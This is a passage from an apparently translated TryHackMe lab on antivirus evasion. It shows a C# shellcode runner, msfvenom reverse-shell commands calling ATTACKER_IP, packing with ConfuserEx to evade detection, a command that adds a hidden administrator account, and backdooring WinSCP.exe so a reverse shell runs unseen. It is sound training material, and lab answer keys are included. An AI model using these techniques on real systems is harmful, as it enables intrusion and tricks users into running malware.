style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token class-name">IntPtr</span><span class="token plain"> threadHandle </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> IntPtr</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">Zero</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token class-name">UInt32</span><span class="token plain"> threadId </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token class-name">IntPtr</span><span class="token plain"> parameter </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> IntPtr</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">Zero</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    threadHandle </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">CreateThread</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> codeAddr</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> parameter</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">ref</span><span class="token plain"> threadId</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">WaitForSingleObject</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">threadHandle</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0xFFFFFFFF</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre></div></div></div></div></details>
<p>此有效载荷获取由msfvenom生成的shellcode并在单独的线程中运行它。 为此，您需要生成一个新的shellcode并将其放入代码的<code>shellcode</code>变量中：</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_OeMC">Command Prompt</div><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">C:</span><span class="token punctuation" style="color:#393A34">\</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> msfvenom </span><span class="token parameter variable" style="color:#36acaa">-p</span><span class="token plain"> windows/x64/shell_reverse_tcp </span><span class="token assign-left variable" style="color:#36acaa">LHOST</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">ATTACKER_IP </span><span class="token assign-left variable" style="color:#36acaa">LPORT</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">7478</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-f</span><span class="token plain"> csharp</span><br></span></code></pre></div></div>
<p>然后，您可以使用以下命令在Windows机器上编译您的有效载荷：</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_OeMC">Command Prompt</div><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">C:</span><span class="token punctuation" style="color:#393A34">\</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> csc UnEncStagelessPayload.cs</span><br></span></code></pre></div></div>
<p>一旦您有一个可工作的可执行文件，您可以尝试将其上传到THM防病毒检查！ 页面（桌面上的链接）。 它应该立即被防病毒软件标记。 让我们在同一个有效载荷上使用打包器，看看会发生什么。</p>
<p>我们将使用<a href="https://github.com/mkaring/ConfuserEx/releases/tag/v1.6.0" target="_blank" rel="noopener noreferrer" class="">ConfuserEx</a>打包器来完成此任务，因为我们的有效载荷是用<code>.NET</code>编程的。 为方便起见，您可以在桌面上找到它的快捷方式。</p>
<p>ConfuserEx将要求您指定其工作文件夹。 请确保选择您的桌面作为基础目录，如下图所示。 设置好基础目录后，将要打包的可执行文件拖放到界面上，您应该会得到以下结果：</p>
<p><img decoding="async" loading="lazy" alt="Packer config part1" src="/TryHackMe-CN/assets/images/image_20251110-191013-219b65a0e191f8c72e1191c5c1f46504.png" width="780" height="586" class="img_ev3q"></p>
<p>让我们转到设置选项卡并选择我们的有效负载。 选择后，点击&quot;+&quot;按钮将设置添加到您的有效负载中。 这应该会创建一个名为&quot;true&quot;的规则。 请确保同时启用压缩：</p>
<p><img decoding="async" loading="lazy" alt="Packer config part2" src="/TryHackMe-CN/assets/images/image_20251110-191034-710ad3b00d828cbff025ad040e313c4f.png" width="780" height="585" class="img_ev3q"></p>
<p>我们现在将编辑&quot;true&quot;规则并将其设置为最大预设：</p>
<p><img decoding="async" loading="lazy" alt="打包器配置部分3" src="/TryHackMe-CN/assets/images/image_20251111-191147-0609c4588f5a54145e705e530551430e.png" width="386" height="593" class="img_ev3q"></p>
<p>最后，我们将转到&quot;保护！&quot;选项卡并点击&quot;保护&quot;：</p>
<p><img decoding="async" loading="lazy" alt="打包器配置部分4" src="/TryHackMe-CN/assets/images/image_20251112-191201-2e401c6320c03304a82e438009796c8d.png" width="779" height="586" class="img_ev3q"></p>
<p>新的有效载荷应该已准备就绪，并且希望在上传到 THM 防病毒检查器时不会触发任何警报！ （桌面上有快捷方式）。 实际上，如果您执行您的有效载荷并设置一个 <code>nc</code> 监听器，您应该能够获得一个反向 shell：</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_OeMC">AttackBox</div><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">user@attackbox$ </span><span class="token function" style="color:#d73a49">nc</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-lvp</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">7478</span><br></span></code></pre></div></div>
<p>到目前为止一切顺利，但还记得我们讨论过防病毒软件进行内存扫描吗？ 如果您尝试在反向 shell 上运行命令，防病毒软件会注意到您的 shell 并终止它。 这是因为 Windows Defender 会挂钩某些 Windows API 调用，并在使用此类 API 调用时进行内存扫描。 对于任何使用 msfvenom 生成的 shell，都会调用 CreateProcess() 并被检测到。</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="那么我们现在该怎么办">那么我们现在该怎么办？<a href="#那么我们现在该怎么办" class="hash-link" aria-label="那么我们现在该怎么办？的直接链接" title="那么我们现在该怎么办？的直接链接" translate="no">​</a></h3>
<p>虽然击败内存扫描超出了本房间的范围，但您可以做一些简单的事情来避免检测：</p>
<ul>
<li class=""><strong>只需稍等片刻</strong>。 尝试再次生成反向 shell，并在发送任何命令前等待大约 5 分钟。 您会看到防病毒软件不再抱怨。 原因是扫描内存是一项昂贵的操作。 因此，防病毒软件会在您的进程启动后的一段时间内进行扫描，但最终会停止。</li>
<li class=""><strong>使用更小的有效载荷</strong>。 有效载荷越小，被检测到的可能性就越小。 如果您使用 msfvenom 执行单个命令而不是反向 shell，防病毒软件将更难检测到它。 您可以尝试使用 <code>msfvenom -a x64 -p windows/x64/exec CMD=&#x27;net user pwnd Password321 /add;net localgroup administrators pwnd /add&#x27; -f csharp</code> 看看会发生什么。</li>
</ul>
<p>如果检测不是问题，您甚至可以使用一个简单的技巧。 从您的反向 shell 中再次运行 cmd.exe。 防病毒软件会检测到您的有效载荷并终止相关进程，但不会终止您刚刚生成的新 cmd.exe。</p>
<p>虽然每个防病毒软件的行为都不同，但大多数情况下，都会有类似的方法绕过它们，因此值得探索在测试时注意到的任何奇怪行为。</p>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>回答以下问题</div><div class="admonitionContent_BuS1"><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> 打包器是否有助于混淆恶意代码以绕过防病毒解决方案？ (是/否) </summary><div><div class="collapsibleContent_i85q"><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">yea</span><br></span></code></pre></div></div></div></div></details><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> 打包器是否通常在运行前在内存中解包原始代码？ (是/否) </summary><div><div class="collapsibleContent_i85q"><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">yea</span><br></span></code></pre></div></div></div></div></details><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> 某些打包器是否被某些防病毒解决方案检测为恶意？ (是/否) </summary><div><div class="collapsibleContent_i85q"><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">yea</span><br></span></code></pre></div></div></div></div></details><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> 按照说明创建打包的有效载荷并将其上传到 THM 防病毒检查器，地址为 <code>http://MACHINE_IP/</code> </summary><div><div class="collapsibleContent_i85q"><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">No answer needed</span><br></span></code></pre></div></div></div></div></details></div></div>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="任务-10-绑定器">任务 10 绑定器<a href="#任务-10-绑定器" class="hash-link" aria-label="任务 10 绑定器的直接链接" title="任务 10 绑定器的直接链接" translate="no">​</a></h2>
<p>虽然不是防病毒绕过方法，但在设计要分发给最终用户的恶意有效载荷时，绑定器也很重要。 <strong>绑定器</strong> 是一种将两个（或更多）可执行文件合并为一个的程序。 当您希望将有效载荷隐藏在另一个已知程序中分发以欺骗用户相信他们正在执行不同的程序时，通常会使用它。</p>
<p><img decoding="async" loading="lazy" alt="绑定器" src="/TryHackMe-CN/assets/images/image_20251117-191753-0a247d89aedbd936d8d4388d2d2d0992.png" width="1386" height="802" class="img_ev3q"></p>
<p>虽然每个绑定器的工作方式可能略有不同，但它们基本上会将您的 shellcode 代码添加到合法程序中，并以某种方式执行它。</p>
<p>例如，您可以更改 PE 头中的入口点，使您的 shellcode 在程序之前执行，然后在完成后将执行重定向回合法程序。 这样，当用户点击生成的可执行文件时，您的 shellcode 将首先静默执行，然后继续正常运行程序，而用户不会注意到。</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="使用-msfvenom-进行绑定">使用 msfvenom 进行绑定<a href="#使用-msfvenom-进行绑定" class="hash-link" aria-label="使用 msfvenom 进行绑定的直接链接" title="使用 msfvenom 进行绑定的直接链接" translate="no">​</a></h3>
<p>您可以使用 <code>msfvenom</code> 轻松将您偏好的有效载荷植入任何 .exe 文件中。 该二进制文件仍将正常工作，但会静默执行额外的有效载荷。 msfvenom 使用的方法通过为您的恶意程序创建一个额外的线程来注入它，因此与之前提到的略有不同，但达到了相同的结果。 拥有一个单独的线程甚至更好，因为如果您的 shellcode 因某种原因失败，您的程序不会被阻塞。</p>
<p>对于此任务，我们将对位于 <code>C:\Tools\WinSCP</code> 的 WinSCP 可执行文件进行后门处理。</p>
<p>要创建后门的 WinSCP.exe，我们可以在 Windows 机器上使用以下命令：</p>
<p><strong>注意</strong>：为方便起见，Windows 机器上安装了 Metasploit，但生成有效载荷可能需要最多三分钟（产生的警告可以安全忽略）。</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_OeMC">AttackBox</div><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">C:</span><span class="token punctuation" style="color:#393A34">\</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> msfvenom </span><span class="token parameter variable" style="color:#36acaa">-x</span><span class="token plain"> WinSCP.exe </span><span class="token parameter variable" style="color:#36acaa">-k</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-p</span><span class="token plain"> windows/shell_reverse_tcp </span><span class="token assign-left variable" style="color:#36acaa">lhost</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">ATTACKER_IP </span><span class="token assign-left variable" style="color:#36acaa">lport</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">7779</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-f</span><span class="token plain"> exe </span><span class="token parameter variable" style="color:#36acaa">-o</span><span class="token plain"> WinSCP-evil.exe</span><br></span></code></pre></div></div>
<p>生成的 WinSCP-evil.exe 将在用户不知情的情况下执行 reverse_tcp meterpreter 有效载荷。 在执行任何操作之前，请记住设置一个 <code>nc</code> 监听器以接收反向 shell。 当您执行后门的可执行文件时，它应该向您发送一个反向 shell，同时继续为用户执行 WinSCP.exe：</p>
<p><img decoding="async" loading="lazy" alt="img" src="/TryHackMe-CN/assets/images/image_20251119-191917-0ce07598d311293756197d9da2563671.png" width="1845" height="573" class="img_ev3q"></p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="绑定器和防病毒软件">绑定器和防病毒软件<a href="#绑定器和防病毒软件" class="hash-link" aria-label="绑定器和防病毒软件的直接链接" title="绑定器和防病毒软件的直接链接" translate="no">​</a></h3>
<p>绑定器在隐藏您的有效载荷免受防病毒解决方案检测方面作用不大。 简单地将两个可执行文件合并而不做任何更改意味着生成的可执行文件仍会触发原始有效载荷的任何签名。</p>
<p>绑定器的主要用途是欺骗用户相信他们正在执行合法的可执行文件而不是恶意有效载荷。</p>
<p>在创建真实有效载荷时，您可能希望使用编码器、加密器或打包器来隐藏您的 shellcode 免受基于签名的防病毒软件检测，然后将其绑定到已知的可执行文件中，以便用户不知道正在执行什么。</p>
<p>请随意尝试将您的绑定可执行文件上传到 THM 防病毒检查网站（桌面上有链接）而不进行任何打包，您应该会从服务器收到检测结果，因此这种方法本身在尝试从服务器获取标志时不会有太大帮助。</p>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>回答以下问题</div><div class="admonitionContent_BuS1"><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> 绑定器是否有助于绕过防病毒解决方案？ (是/否) </summary><div><div class="collapsibleContent_i85q"><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">nay</span><br></span></code></pre></div></div></div></div></details><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> 绑定器是否可用于使有效载荷看起来像合法的可执行文件？ (是/否) </summary><div><div class="collapsibleContent_i85q"><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">yea</span><br></span></code></pre></div></div></div></div></details></div></div>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="任务-11-结论">任务 11 结论<a href="#任务-11-结论" class="hash-link" aria-label="任务 11 结论的直接链接" title="任务 11 结论的直接链接" translate="no">​</a></h2>
<p>在本房间中，我们探讨了攻击者可用于规避仅依赖基于磁盘检测的防病毒引擎的一些策略。 虽然这只是任何现代防病毒引擎可用机制之一，但我们至少应该能够将我们的有效载荷作为第一步传递到受害者的磁盘上。 绕过内存检测和其他高级检测机制留待未来的房间讨论。 您可能想查看 <a href="https://tryhackme.com/room/runtimedetectionevasion" target="_blank" rel="noopener noreferrer" class="">运行时检测规避</a> 以获取有关绕过可能阻止您的有效载荷触发的进一步 Windows 安全机制的更多信息。</p>
<p>请记住，任何加密器、编码器或打包器的成功很大程度上取决于防病毒引擎不知道它们的任何特征。 因此，在尝试绕过任何实际解决方案时，能够自定义自己的有效载荷至关重要。</p>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>回答以下问题</div><div class="admonitionContent_BuS1"><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> 点击并继续学习！ </summary><div><div class="collapsibleContent_i85q"><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">No answer needed</span><br></span></code></pre></div></div></div></div></details></div></div></div><footer class="theme-doc-footer docusaurus-mt-lg"><div class="row margin-top--sm theme-doc-footer-edit-meta-row"><div class="col noPrint_WFHX"><a href="https://github.com/TryHackMyOffsecBox/TryHackMe-CN/tree/main/packages/create-docusaurus/templates/shared/docs/Modules/Host Evasions/avevasionshellcode.md" target="_blank" rel="noopener noreferrer" class="theme-edit-this-page"><svg fill="currentColor" height="20" width="20" viewBox="0 0 40 40" class="iconEdit_Z9Sw" aria-hidden="true"><g><path d="m34.5 11.7l-3 3.1-6.3-6.3 3.1-3q0.5-0.5 1.2-0.5t1.1 0.5l3.9 3.9q0.5 0.4 0.5 1.1t-0.5 1.2z m-29.5 17.1l18.4-18.5 6.3 6.3-18.4 18.4h-6.3v-6.2z"></path></g></svg>编辑此页</a></div><div class="col lastUpdated_JAkA"></div></div></footer></article><nav class="docusaurus-mt-lg pagination-nav" aria-label="文件选项卡"><a class="pagination-nav__link pagination-nav__link--prev" href="/TryHackMe-CN/docs/Modules/Host Evasions/"><div class="pagination-nav__sublabel">上一页</div><div class="pagination-nav__label">主机规避</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/TryHackMe-CN/docs/Modules/Host Evasions/obfuscationprinciples"><div class="pagination-nav__sublabel">下一页</div><div class="pagination-nav__label">混淆原理</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#任务1-简介" class="table-of-contents__link toc-highlight">任务1 简介</a><ul><li><a href="#目标" class="table-of-contents__link toc-highlight">目标</a></li><li><a href="#先决条件" class="table-of-contents__link toc-highlight">先决条件</a></li></ul></li><li><a href="#任务-2-挑战" class="table-of-contents__link toc-highlight">任务 2 挑战</a></li><li><a href="#任务-3-pe-结构" class="table-of-contents__link toc-highlight">任务 3 PE 结构</a><ul><li><a href="#什么是-pe" class="table-of-contents__link toc-highlight">什么是 PE？</a></li><li><a href="#为什么我们需要了解pe" class="table-of-contents__link toc-highlight">为什么我们需要了解PE？</a></li><li><a href="#pe-bear" class="table-of-contents__link toc-highlight">PE-Bear</a></li></ul></li><li><a href="#任务4-shellcode简介" class="table-of-contents__link toc-highlight">任务4 Shellcode简介</a><ul><li><a href="#一个简单的shellcode" class="table-of-contents__link toc-highlight">一个简单的Shellcode</a></li></ul></li><li><a href="#任务5-生成shellcode" class="table-of-contents__link toc-highlight">任务5 生成Shellcode</a><ul><li><a href="#使用公共工具生成shellcode" class="table-of-contents__link toc-highlight">使用公共工具生成Shellcode</a></li><li><a href="#shellcode注入" class="table-of-contents__link toc-highlight">Shellcode注入</a></li><li><a href="#从exe文件生成shellcode" class="table-of-contents__link toc-highlight">从EXE文件生成Shellcode</a></li></ul></li><li><a href="#任务-6-分阶段载荷" class="table-of-contents__link toc-highlight">任务 6 分阶段载荷</a><ul><li><a href="#无阶段载荷" class="table-of-contents__link toc-highlight">无阶段载荷</a></li><li><a href="#分阶段载荷" class="table-of-contents__link toc-highlight">分阶段载荷</a></li><li><a href="#分阶段-vs-无阶段" class="table-of-contents__link toc-highlight">分阶段 vs. 无阶段</a></li><li><a href="#metasploit-中的阶段器" class="table-of-contents__link toc-highlight">Metasploit 中的阶段器</a></li><li><a href="#创建您自己的阶段器" class="table-of-contents__link toc-highlight">创建您自己的阶段器</a></li><li><a href="#使用我们的阶段器运行反向-shell" class="table-of-contents__link toc-highlight">使用我们的阶段器运行反向 shell</a></li></ul></li><li><a href="#任务-7-编码和加密简介" class="table-of-contents__link toc-highlight">任务 7 编码和加密简介</a><ul><li><a href="#什么是编码" class="table-of-contents__link toc-highlight">什么是编码？</a></li><li><a href="#什么是加密" class="table-of-contents__link toc-highlight">什么是加密？</a></li><li><a href="#为什么我们需要了解编码和加密" class="table-of-contents__link toc-highlight">为什么我们需要了解编码和加密？</a></li></ul></li><li><a href="#任务-8-shellcode-编码和加密" class="table-of-contents__link toc-highlight">任务 8 Shellcode 编码和加密</a><ul><li><a href="#使用-msfvenom-进行编码" class="table-of-contents__link toc-highlight">使用 MSFVenom 进行编码</a></li><li><a href="#使用-msfvenom-进行加密" class="table-of-contents__link toc-highlight">使用 MSFVenom 进行加密</a></li><li><a href="#创建自定义-payload" class="table-of-contents__link toc-highlight">创建自定义 payload</a></li><li><a href="#编码器" class="table-of-contents__link toc-highlight">编码器</a></li><li><a href="#自解码有效载荷" class="table-of-contents__link toc-highlight">自解码有效载荷</a></li></ul></li><li><a href="#任务9-打包器" class="table-of-contents__link toc-highlight">任务9 打包器</a><ul><li><a href="#打包应用程序" class="table-of-contents__link toc-highlight">打包应用程序</a></li><li><a href="#打包器和防病毒软件" class="table-of-contents__link toc-highlight">打包器和防病毒软件</a></li><li><a href="#打包我们的shellcode" class="table-of-contents__link toc-highlight">打包我们的shellcode</a></li><li><a href="#那么我们现在该怎么办" class="table-of-contents__link toc-highlight">那么我们现在该怎么办？</a></li></ul></li><li><a href="#任务-10-绑定器" class="table-of-contents__link toc-highlight">任务 10 绑定器</a><ul><li><a href="#使用-msfvenom-进行绑定" class="table-of-contents__link toc-highlight">使用 msfvenom 进行绑定</a></li><li><a href="#绑定器和防病毒软件" class="table-of-contents__link toc-highlight">绑定器和防病毒软件</a></li></ul></li><li><a href="#任务-11-结论" class="table-of-contents__link toc-highlight">任务 11 结论</a></li></ul></div></div></div></div></main></div></div></div><footer class="theme-layout-footer footer footer--dark"><div class="container container-fluid"><div class="row footer__links"><div class="theme-layout-footer-column col footer__col"><div class="footer__title">Docs</div><ul class="footer__items clean-list"><li class="footer__item"><a class="footer__link-item" href="/TryHackMe-CN/docs">Tutorial</a></li></ul></div><div class="theme-layout-footer-column col footer__col"><div class="footer__title">Community</div><ul class="footer__items clean-list"><li class="footer__item"><a href="https://github.com/TryHackMyOffsecBox" target="_blank" rel="noopener noreferrer" class="footer__link-item">Github - TryHackMyOffsecBox<svg width="13.5" height="13.5" aria-label="(opens in new tab)" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li><li class="footer__item"><a href="https://github.com/CRONUS-Security" target="_blank" rel="noopener noreferrer" class="footer__link-item">Github - CRONUS-Security<svg width="13.5" height="13.5" aria-label="(opens in new tab)" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li></ul></div></div><div class="footer__bottom text--center"><div class="footer__copyright">Copyright © 2025 TryHackMyOffsecBox. Built with Docusaurus.</div></div></div></footer></div>
</body>
</html>